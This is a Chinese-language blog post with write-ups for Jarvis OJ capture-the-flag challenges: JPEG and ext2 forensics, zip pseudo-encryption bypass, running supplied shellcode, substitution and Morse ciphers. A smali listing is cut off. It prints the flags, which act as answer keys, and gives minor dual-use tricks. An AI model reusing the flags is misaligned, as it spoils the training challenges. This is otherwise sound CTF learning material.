<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">










<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="这一页用于更新Jarvis OJ平台的题目，有些简单的题目没必要写也懒得写就不写了。 每次更新我都会加在文章的末尾。">
<meta name="keywords" content="CTF,PWN,Jarvis OJ">
<meta property="og:type" content="article">
<meta property="og:title" content="Jarvis OJ平台 WP">
<meta property="og:url" content="https://veritas501.github.io/2017/03/10/JarvisOJ_WP/index.html">
<meta property="og:site_name" content="Veritas501&#39;s Blog">
<meta property="og:description" content="这一页用于更新Jarvis OJ平台的题目，有些简单的题目没必要写也懒得写就不写了。 每次更新我都会加在文章的末尾。">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://dn.jarvisoj.com/challengefiles/logo.jpg.8244d3d060e9806accc508ec689fabfb?logo.jpg">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_c5acbeeb60a1b41b60307f7c472fc73b.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_a6565d20da3e15693dd0fa0ff1f83fad.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_0d5d53078df9b7a5f504cdee3af6cfe1.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_9b741ee5c3a6bf469820f7a4aa7a185b.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_73ac881696daf05a8b471777c7eeff3b.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_303abb84542d5251180d03646c05d1b7.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_1fe6080905651a1ddc482a7d8add8428.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_daf8756af1b82b0cefba4f2037926ab4.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_247ee6771134453a387da170708aedd3.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_56fa0188550a62d5771d75778de49dff.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_e17df0752af89ba239ea8944485dcab1.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_4f31242fb2c24459d26958f791170ec3.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_bca4cdaa9f883ac253d5a7cd0422823d.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_883183d4f99257afcb27082f7fe1ebe9.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_4d7fc09e2246c464d42e377449104a6b.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_41bc5b5b2d9d012e48ba8b7e2ea4e096.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_7a0eddd01d532e95ac8a905e617c70b4.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_c0f71a7d08460009b1ff313dcdbf0294.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_a768142147ca3976598941b5c6c67161.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_b17d7868f95d135b35908e74805b7282.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_3d206de3cbec18f77f0d4f17ce1211b6.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_891aa400700ee6e47c927947da23b46b.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_37f78424cf5537c2070be0345aa08465.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_425dff79a07cc80c2268a13fa49d8f37.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_7387c8a2a70c18e3adb795228e7c15e9.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_077bf75336d67a11fc6882fcd36c9007.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_6be1252b2b58b57b42691ee5e40ae831.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_52b21232a183fe29f7e96d09c42c3842.png">
<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_0483903376e00febdd26d091f551c747.png">
<meta property="og:updated_time" content="2018-02-10T12:39:25.270Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Jarvis OJ平台 WP">
<meta name="twitter:description" content="这一页用于更新Jarvis OJ平台的题目，有些简单的题目没必要写也懒得写就不写了。 每次更新我都会加在文章的末尾。">
<meta name="twitter:image" content="https://dn.jarvisoj.com/challengefiles/logo.jpg.8244d3d060e9806accc508ec689fabfb?logo.jpg">






  <link rel="canonical" href="https://veritas501.github.io/2017/03/10/JarvisOJ_WP/"/>



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Jarvis OJ平台 WP | Veritas501's Blog</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Veritas501's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-guestbook">
    <a href="/Guestbook" rel="section">
      <i class="menu-item-icon fa fa-fw fa-pencil"></i> <br />guestbook</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://veritas501.github.io/2017/03/10/JarvisOJ_WP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Veritas501">
      <meta itemprop="description" content="开始踏上Re&Pwn之路...">
      <meta itemprop="image" content="/images/215.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veritas501's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Jarvis OJ平台 WP
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-03-10 00:00:00" itemprop="dateCreated datePublished" datetime="2017-03-10T00:00:00+08:00">2017-03-10</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-02-10 20:39:25" itemprop="dateModified" datetime="2018-02-10T20:39:25+08:00">2018-02-10</time>
              
            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/03/10/JarvisOJ_WP/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2017/03/10/JarvisOJ_WP/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2017/03/10/JarvisOJ_WP/" class="leancloud_visitors" data-flag-title="Jarvis OJ平台 WP">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Views: </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>这一页用于更新<a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">Jarvis OJ</a>平台的题目，有些简单的题目没必要写也懒得写就不写了。</p>
<p>每次更新我都会加在文章的末尾。<br><a id="more"></a></p>
<hr>
<h2 id="Basic-美丽的实验室logo"><a href="#Basic-美丽的实验室logo" class="headerlink" title="Basic - 美丽的实验室logo"></a>Basic - 美丽的实验室logo</h2><p>题目描述：</p>
<blockquote>
<p>出题人丢下个logo就走了，大家自己看着办吧</p>
<p><img src="https://dn.jarvisoj.com/challengefiles/logo.jpg.8244d3d060e9806accc508ec689fabfb?logo.jpg" alt="logo.jpg.8244d3d060e9806accc508ec689fabfb"></p>
</blockquote>
<p>先拿010editor看一下，搜索jpg的文件头’JFIF’：</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_c5acbeeb60a1b41b60307f7c472fc73b.png" alt=""></p>
<p>到第二处，dump出后面的数据，是另外一张图片，但是不能直接打开，因为文件头被改掉了，</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_a6565d20da3e15693dd0fa0ff1f83fad.png" alt=""></p>
<p>把文件头改回来后看到flag：</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_0d5d53078df9b7a5f504cdee3af6cfe1.png" alt=""></p>
<h2 id="Basic-神秘的文件"><a href="#Basic-神秘的文件" class="headerlink" title="Basic - 神秘的文件"></a>Basic - 神秘的文件</h2><p>题目描述：</p>
<blockquote>
<p>出题人太懒，还是就丢了个文件就走了，你能发现里面的秘密吗？<br><a href="https://dn.jarvisoj.com/challengefiles/haha.f38a74f55b4e193561d1b707211cf7eb" target="_blank" rel="noopener">haha.f38a74f55b4e193561d1b707211cf7eb</a></p>
</blockquote>
<p>这道题的解题过程有些曲折，但我还是按照我做题时的步骤来。</p>
<p>打开文件，看到一大堆的‘0x00’，本能的反应：“我写个脚本先把0给去了。”</p>
<p>脚本不贴了，应该都会的。</p>
<p>去了0以后是这样的：</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_9b741ee5c3a6bf469820f7a4aa7a185b.png" alt=""></p>
<p>在结尾处有字符串：</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_73ac881696daf05a8b471777c7eeff3b.png" alt=""></p>
<p>Haf.But the ciontent is lspilted ine pieces ca n you makes the pieceys togethers. Now thist is the fleag PCTF{P1hm3c3_7oghte r_i7}. Thei rest is usp to you.  Cheer up, eboy.asy,a and I kno w you can eeasily decxompress oft it and fi2nd the con tent in it</p>
<p>首先看到了pctf，可惜直接输入是错误的。</p>
<p>大致上能看懂，但感觉这中间插入了一些什么。</p>
<p>人脑分析发现，插入的内容为“file system is XXXXXX(没分析出来) ext2”</p>
<p>ext2这个我听说过啊，就是一种分区格式嘛，网上找一个工具<a href="http://www.chrysocome.net/" target="_blank" rel="noopener">www.chrysocome.net</a>，用工具打开没处理过的文件。</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_303abb84542d5251180d03646c05d1b7.png" alt=""></p>
<p>把文件全部提取出来。</p>
<p>发现每个文件中都只含有一个字符，于是写个python脚本提取喽。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">'lost+found/'</span></span><br><span class="line">out=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">254</span>):</span><br><span class="line">    out+=open(path+str(i),<span class="string">'r'</span>).read()</span><br><span class="line"><span class="keyword">print</span> out</span><br></pre></td></tr></table></figure>
<p>输出内容：<br>Haha ext2 file system is easy, and I know you can easily decompress of it and find the content in it.But the content is spilted in pieces can you make the pieces together. Now this is the flag PCTF{P13c3_7oghter_i7}. The rest is up to you. Cheer up, boy.</p>
<p>于是得到flag：<code>PCTF{P13c3_7oghter_i7}</code></p>
<h2 id="Basic-Help"><a href="#Basic-Help" class="headerlink" title="Basic - Help!!"></a>Basic - Help!!</h2><p>题目描述：</p>
<blockquote>
<p>出题人硬盘上找到一个神秘的压缩包，里面有个word文档，可是好像加密了呢~让我们一起分析一下吧！<br><a href="https://dn.jarvisoj.com/challengefiles/word.zip.a5465b18cb5d7d617c861dee463fe58b" target="_blank" rel="noopener">word.zip.a5465b18cb5d7d617c861dee463fe58b</a></p>
</blockquote>
<p>先二进制查看一下，发现并没有在zip中藏文件或藏字符串。</p>
<p>到网上下一个破解zip的工具，提示如下：</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_1fe6080905651a1ddc482a7d8add8428.png" alt=""></p>
<p>那应该就是zip伪加密了。</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_daf8756af1b82b0cefba4f2037926ab4.png" alt=""></p>
<p>修改此处，把0900改成0000。然后成功解压。</p>
<p>得到一个docx文档，打开文档只有一张图片：</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_247ee6771134453a387da170708aedd3.png" alt=""></p>
<p>用010editor查看这个docx，意外的发现，原来docx有PK头，活着么久现在才知道原来docx是可以解压的！（吃鲸.jpg）</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_56fa0188550a62d5771d75778de49dff.png" alt=""></p>
<p>在目录<code>word.docx.unzip\word\media</code>下，发现两张图片：</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_e17df0752af89ba239ea8944485dcab1.png" alt=""></p>
<p>其中第二张:</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_4f31242fb2c24459d26958f791170ec3.png" alt=""></p>
<p>flag:<code>PCTF{You_Know_moR3_4boUt_woRd}</code></p>
<h2 id="Basic-Shellcode"><a href="#Basic-Shellcode" class="headerlink" title="Basic - Shellcode"></a>Basic - Shellcode</h2><p>题目描述：</p>
<blockquote>
<p>作为一个黑客，怎么能不会使用shellcode?<br>这里给你一段shellcode，你能正确使用并最后得到flag吗？<br><a href="https://dn.jarvisoj.com/challengefiles/shellcode.06f28b9c8f53b0e86572dbc9ed3346bc" target="_blank" rel="noopener">shellcode.06f28b9c8f53b0e86572dbc9ed3346bc</a></p>
</blockquote>
<p>这题比较迷，迷在我不知道怎么把机器码解出来，讲道理又不是crypto。。。</p>
<p>网上查了一下，是要用一个叫<a href="https://github.com/inquisb/shellcodeexec" target="_blank" rel="noopener">Shellcodeexec</a>的程序跑一下，就可以拿到flag。真是醉了。。</p>
<p>差不多就是这个效果：</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_bca4cdaa9f883ac253d5a7cd0422823d.png" alt=""></p>
<p>flag:’PCTF{Begin_4_good_pwnn3r}’</p>
<h2 id="Basic-A-Piece-Of-Cake"><a href="#Basic-A-Piece-Of-Cake" class="headerlink" title="Basic - A Piece Of Cake"></a>Basic - A Piece Of Cake</h2><p>题目描述：</p>
<blockquote>
<p>nit yqmg mqrqn bxw mtjtm nq rqni fiklvbxu mqrqnl xwg dvmnzxu lqjnyxmt xatwnl, rzn nit uxnntm xmt zlzxuuk mtjtmmtg nq xl rqnl. nitmt vl wq bqwltwlzl qw yivbi exbivwtl pzxuvjk xl mqrqnl rzn nitmt vl atwtmxu xamttetwn xeqwa tsftmnl, xwg nit fzruvb, nixn mqrqnl ntwg nq gq lqet qm xuu qj nit jquuqyvwa: xbbtfn tutbnmqwvb fmqamxeevwa, fmqbtll gxnx qm fiklvbxu ftmbtfnvqwl tutbnmqwvbxuuk, qftmxnt xznqwqeqzluk nq lqet gtamtt, eqdt xmqzwg, qftmxnt fiklvbxu fxmnl qj vnltuj qm fiklvbxu fmqbtlltl, ltwlt xwg exwvfzuxnt nitvm twdvmqwetwn, xwg tsivrvn vwntuuvatwn rtixdvqm - tlftbvxuuk rtixdvqm yivbi evevbl izexwl qm qnitm xwvexul. juxa vl lzrlnvnzntfxllvldtmktxlkkqzaqnvn. buqltuk mtuxntg nq nit bqwbtfn qj x mqrqn vl nit jvtug qj lkwnitnvb rvquqak, yivbi lnzgvtl twnvnvtl yiqlt wxnzmt vl eqmt bqefxmxrut nq rtvwal nixw nq exbivwtl.</p>
</blockquote>
<blockquote>
<p>提交格式：PCTF{flag}</p>
</blockquote>
<p>蛤蛤蛤，又是替换密码，我能说这个我还是只会用工具解吗233333。</p>
<p><a href="http://quipqiup.com/" target="_blank" rel="noopener">http://quipqiup.com/</a></p>
<p>扔进去，模式调成statistics</p>
<p>解得明文：</p>
<p>the word robot can refer to both physical robots and virtual software agents, but the latter are usually referred to as bots. there is no consensus on which machines qualify as robots but there is general agreement among experts, and the public, that robots tend to do some or all of the following: accept electronic programming, process data or physical perceptions electronically, operate autonomously to some degree, move around, operate physical parts of itself or physical processes, sense and manipulate their environment, and exhibit intelligent behavior - especially behavior which mimics humans or other animals. flag is substitutepassisveryeasyyougotit. closely related to the concept of a robot is the field of synthetic biology, which studies entities whose nature is more comparable to beings than to machines.</p>
<p>flag:<code>PCTF{substitutepassisveryeasyyougotit}</code></p>
<h2 id="Basic-字符串"><a href="#Basic-字符串" class="headerlink" title="Basic - -.-字符串"></a>Basic - -.-字符串</h2><p>题目描述：</p>
<blockquote>
<p>请选手观察以下密文并转换成flag形式</p>
</blockquote>
<blockquote>
<p>..-. .-.. .- –. ….. ..— ..— —– .—- —.. -.. -…. -…. ….. …– —.. –… -.. .—- -.. .- —-. …– .—- —.. .—- ..— -… –… –… –… -…. …– ….- .—- —–</p>
</blockquote>
<blockquote>
<p>flag形式为32位大写md5</p>
</blockquote>
<blockquote>
<p>题目来源：CFF2016</p>
</blockquote>
<p>一望而知的摩斯电码，但我这次打算写个脚本实现自动解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># split by space</span></span><br><span class="line">dic = &#123;<span class="string">'.-'</span>:<span class="string">'A'</span>,<span class="string">'-...'</span>:<span class="string">'B'</span>,<span class="string">'-.-.'</span>:<span class="string">'C'</span>,<span class="string">'-..'</span>:<span class="string">'D'</span>,<span class="string">'.'</span>:<span class="string">'E'</span>,<span class="string">'..-.'</span>:<span class="string">'F'</span>,<span class="string">'--.'</span>:<span class="string">'G'</span>,<span class="string">'....'</span>:<span class="string">'H'</span>,<span class="string">'..'</span>:<span class="string">'I'</span>,<span class="string">'.---'</span>:<span class="string">'J'</span>,<span class="string">'-.-'</span>:<span class="string">'K'</span>,<span class="string">'.-..'</span>:<span class="string">'L'</span>,<span class="string">'--'</span>:<span class="string">'M'</span>,<span class="string">'-.'</span>:<span class="string">'N'</span>,<span class="string">'---'</span>:<span class="string">'O'</span>,<span class="string">'.--.'</span>:<span class="string">'P'</span>,<span class="string">'--.-'</span>:<span class="string">'Q'</span>,<span class="string">'.-.'</span>:<span class="string">'R'</span>,<span class="string">'...'</span>:<span class="string">'S'</span>,<span class="string">'-'</span>:<span class="string">'T'</span>,<span class="string">'..-'</span>:<span class="string">'U'</span>,<span class="string">'...-'</span>:<span class="string">'V'</span>,<span class="string">'.--'</span>:<span class="string">'W'</span>,<span class="string">'-..-'</span>:<span class="string">'X'</span>,<span class="string">'-.--'</span>:<span class="string">'Y'</span>,<span class="string">'--..'</span>:<span class="string">'Z'</span>,<span class="string">'.-.-.-'</span>:<span class="string">'.'</span>,<span class="string">'--..--'</span>:<span class="string">','</span>,<span class="string">'---...'</span>:<span class="string">':'</span>,<span class="string">'.-..-.'</span>:<span class="string">'"'</span>,<span class="string">'.----.'</span>:<span class="string">'\''</span>,<span class="string">'-.-.--'</span>:<span class="string">'!'</span>,<span class="string">'..--..'</span>:<span class="string">'?'</span>,<span class="string">'.--.-.'</span>:<span class="string">'@'</span>,<span class="string">'-....-'</span>:<span class="string">'-'</span>,<span class="string">'-.-.-.'</span>:<span class="string">';'</span>,<span class="string">'.-.-.'</span>:<span class="string">'+'</span>,<span class="string">'..--.-'</span>:<span class="string">'_'</span>,<span class="string">'...-..-'</span>:<span class="string">'$'</span>,<span class="string">'-..-.'</span>:<span class="string">'/'</span>,<span class="string">'.----'</span>:<span class="string">'1'</span>,<span class="string">'..---'</span>:<span class="string">'2'</span>,<span class="string">'...--'</span>:<span class="string">'3'</span>,<span class="string">'....-'</span>:<span class="string">'4'</span>,<span class="string">'.....'</span>:<span class="string">'5'</span>,<span class="string">'-....'</span>:<span class="string">'6'</span>,<span class="string">'--...'</span>:<span class="string">'7'</span>,<span class="string">'---..'</span>:<span class="string">'8'</span>,<span class="string">'----.'</span>:<span class="string">'9'</span>,<span class="string">'-----'</span>:<span class="string">'0'</span>&#125;</span><br><span class="line"></span><br><span class="line">enc=<span class="string">'..-. .-.. .- --. ..... ..--- ..--- ----- .---- ---.. -.. -.... -.... ..... ...-- ---.. --... -.. .---- -.. .- ----. ...-- .---- ---.. .---- ..--- -... --... --... --... -.... ...-- ....- .---- -----'</span>.split(<span class="string">' '</span>)</span><br><span class="line">dec=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    dec+=dic[c]</span><br><span class="line"><span class="keyword">print</span> dec</span><br></pre></td></tr></table></figure>
<p>得到：<code>FLAG522018D665387D1DA931812B77763410</code></p>
<h2 id="Reverse-Smali"><a href="#Reverse-Smali" class="headerlink" title="Reverse - Smali"></a>Reverse - Smali</h2><p>题目给了一段smali代码：</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span></span><br><span class="line"><span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span></span><br><span class="line"><span class="keyword">.source</span> <span class="string">"Crackme.java"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># instance fields</span></span><br><span class="line"><span class="keyword">.field</span><span class="keyword"> private</span> str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># direct methods</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    